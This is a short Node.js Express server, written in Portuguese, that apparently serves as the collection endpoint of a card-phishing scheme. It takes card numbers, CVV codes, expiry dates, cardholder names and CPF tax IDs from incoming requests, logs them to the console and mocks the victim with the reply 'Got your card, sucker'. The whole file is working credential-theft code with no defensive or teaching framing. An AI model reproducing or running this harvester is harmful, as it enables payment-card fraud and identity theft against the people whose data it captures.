const express = require("express");
const colors = require("colors");

const app = express()

app.get("/", async (req,res) => {
    let card = req.query

    console.log(`${colors.red("Novo Cartão:")}\n\nNúmero: ${colors.blue(card.cardNumber)}\nCVV: ${colors.blue(card.cardCVV)}\nValidade: ${colors.blue(card.cardExpireDate)}\nNome: ${colors.blue(card.cardName)}\nCPF: ${colors.blue(card.userCpf)}`)
    res.send("Peguei seu cartao otario")
})

app.listen(5000, () => {
    console.log("Servidor iniciado na porta 5000!")
})
